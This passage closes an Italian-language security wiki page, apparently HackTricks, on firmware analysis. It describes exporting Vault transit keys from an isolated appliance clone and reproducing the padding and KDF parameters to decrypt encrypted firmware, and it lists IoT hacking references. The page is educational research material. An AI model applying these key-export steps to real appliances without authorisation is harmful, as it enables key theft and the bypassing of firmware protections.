- Rendi esportabili le chiavi transit solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave di unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata utilizzando l'esatta coppia padding/hash usata dal KMS. Una decrittazione PKCS#1 v1.5 fallita e una decrittazione OAEP predefinita fallita **non** dimostrano che la chiave sia errata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie comuni usano SHA-1 come impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decrittazione AES-CBC.

Questo trasforma il problema del "firmware crittografato" in un problema più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline gli esatti parametri di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking del firmware con Claude: competenze senior, autonomia junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di security testing del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva all'attacco dell'Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day nell'hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso alla tua casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora lo vedi: ora sei Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal connettore della porta di ricarica - Parte 2: bypassare l'anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: exploitation over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
